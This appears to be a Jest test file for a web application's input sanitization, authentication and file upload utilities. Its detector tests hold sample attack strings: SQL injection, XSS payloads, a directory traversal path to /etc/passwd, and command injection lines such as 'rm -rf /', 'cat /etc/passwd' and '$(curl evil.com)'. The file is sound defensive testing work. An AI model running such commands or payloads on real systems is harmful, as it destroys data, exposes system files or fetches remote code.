import { describe, it, expect } from '@jest/globals';
import {
  detectSQLInjection,
  detectXSS,
  detectCommandInjection,
  sanitizeInput,
  sanitizeObject,
} from '../utils/input-sanitization';
import {
  validateJWTSecret,
  checkPasswordStrength,
  sanitizeFilePath,
  validateFileUpload,
} from '../utils/securityAudit';

describe('Security - Input Sanitization', () => {
  describe('SQL Injection Detection', () => {
    it('should detect SQL injection attempts', () => {
      expect(detectSQLInjection("'; DROP TABLE users; --")).toBe(true);
      expect(detectSQLInjection('SELECT * FROM users')).toBe(true);
      expect(detectSQLInjection("1' OR '1'='1")).toBe(true);
      expect(detectSQLInjection('UNION SELECT password FROM users')).toBe(true);
    });

    it('should not flag normal text', () => {
      expect(detectSQLInjection('Hello world')).toBe(false);
      expect(detectSQLInjection('user@example.com')).toBe(false);
      expect(detectSQLInjection('My name is John')).toBe(false);
    });
  });

  describe('XSS Detection', () => {
    it('should detect XSS attempts', () => {
      expect(detectXSS('<script>alert("xss")</script>')).toBe(true);
      expect(detectXSS('<img src=x onerror=alert(1)>')).toBe(true);
      expect(detectXSS('javascript:alert(1)')).toBe(true);
      expect(detectXSS('<iframe src="evil.com"></iframe>')).toBe(true);
    });

    it('should not flag normal text', () => {
      expect(detectXSS('Hello world')).toBe(false);
      expect(detectXSS('user@example.com')).toBe(false);
    });
  });

  describe('Command Injection Detection', () => {
    it('should detect command injection attempts', () => {
      expect(detectCommandInjection('test; rm -rf /')).toBe(true);
      expect(detectCommandInjection('test | cat /etc/passwd')).toBe(true);
      expect(detectCommandInjection('test && whoami')).toBe(true);
      expect(detectCommandInjection('$(curl evil.com)')).toBe(true);
    });

    it('should not flag normal text', () => {
      expect(detectCommandInjection('Hello world')).toBe(false);
      expect(detectCommandInjection('user@example.com')).toBe(false);
    });
  });

  describe('Input Sanitization', () => {
    it('should remove dangerous characters', () => {
      const input = '<script>alert("xss")</script>Hello';
      const sanitized = sanitizeInput(input, { allowHTML: false });
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('Hello');
    });

    it('should enforce max length', () => {
      const input = 'a'.repeat(1000);
      const sanitized = sanitizeInput(input, { maxLength: 100 });
      expect(sanitized.length).toBe(100);
    });

    it('should remove null bytes', () => {
      const input = 'Hello\x00World';
      const sanitized = sanitizeInput(input);
      expect(sanitized).not.toContain('\x00');
    });
  });

  describe('Object Sanitization', () => {
    it('should sanitize nested objects', () => {
      const input = {
        name: '<script>alert(1)</script>John',
        nested: {
          value: '<img src=x onerror=alert(1)>',
        },
        array: ['<script>test</script>', 'normal'],
      };

      const sanitized = sanitizeObject(input, { allowHTML: false });
      expect(sanitized.name).not.toContain('<script>');
      expect(sanitized.nested.value).not.toContain('<img');
      expect(sanitized.array[0]).not.toContain('<script>');
    });
  });
});

describe('Security - Authentication', () => {
  describe('JWT Secret Validation', () => {
    it('should validate strong JWT secrets', () => {
      const result = validateJWTSecret('MyStr0ng!Secret#With$Numbers&Special@Characters123');
      expect(result.valid).toBe(true);
      expect(result.issues).toHaveLength(0);
    });

    it('should reject weak JWT secrets', () => {
      const result = validateJWTSecret('weak');
      expect(result.valid).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
    });

    it('should reject common weak patterns', () => {
      const result = validateJWTSecret('secretpassword123');
      expect(result.valid).toBe(false);
      expect(result.issues.some((i) => i.includes('weak pattern'))).toBe(true);
    });
  });

  describe('Password Strength', () => {
    it('should rate strong passwords', () => {
      const result = checkPasswordStrength('MyStr0ng!P@ssw0rd#2024');
      expect(result.strength).toBe('strong');
      expect(result.score).toBeGreaterThanOrEqual(6);
    });

    it('should rate weak passwords', () => {
      const result = checkPasswordStrength('password');
      expect(result.strength).toBe('weak');
      expect(result.feedback.length).toBeGreaterThan(0);
    });

    it('should detect common patterns', () => {
      const result = checkPasswordStrength('aaabbbccc123');
      expect(result.feedback.some((f) => f.includes('pattern'))).toBe(true);
    });
  });
});

describe('Security - File Upload', () => {
  describe('File Path Sanitization', () => {
    it('should prevent directory traversal', () => {
      expect(sanitizeFilePath('../../../etc/passwd')).not.toContain('..');
      expect(sanitizeFilePath('../../file.pdf')).not.toContain('..');
      expect(sanitizeFilePath('folder/../file.pdf')).not.toContain('..');
    });

    it('should normalize slashes', () => {
      expect(sanitizeFilePath('folder\\\\file.pdf')).toBe('folder/file.pdf');
      expect(sanitizeFilePath('folder//file.pdf')).toBe('folder/file.pdf');
    });
  });

  describe('File Upload Validation', () => {
    it('should accept valid PDF files', () => {
      const result = validateFileUpload(
        'document.pdf',
        'application/pdf',
        1024 * 1024 // 1MB
      );
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject oversized files', () => {
      const result = validateFileUpload(
        'large.pdf',
        'application/pdf',
        20 * 1024 * 1024 // 20MB
      );
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('size'))).toBe(true);
    });

    it('should reject invalid MIME types', () => {
      const result = validateFileUpload('script.exe', 'application/x-msdownload', 1024);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('not allowed'))).toBe(true);
    });

    it('should reject double extensions', () => {
      const result = validateFileUpload('document.pdf.exe', 'application/pdf', 1024);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('double'))).toBe(true);
    });

    it('should reject mismatched extensions', () => {
      const result = validateFileUpload('document.exe', 'application/pdf', 1024);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('does not match'))).toBe(true);
    });
  });
});

describe('Security - Rate Limiting', () => {
  // Note: Rate limiting tests would require integration tests with actual Redis
  // These are placeholder tests for the structure

  it('should have rate limit configuration', () => {
    expect(process.env.REDIS_URL).toBeDefined();
  });
});
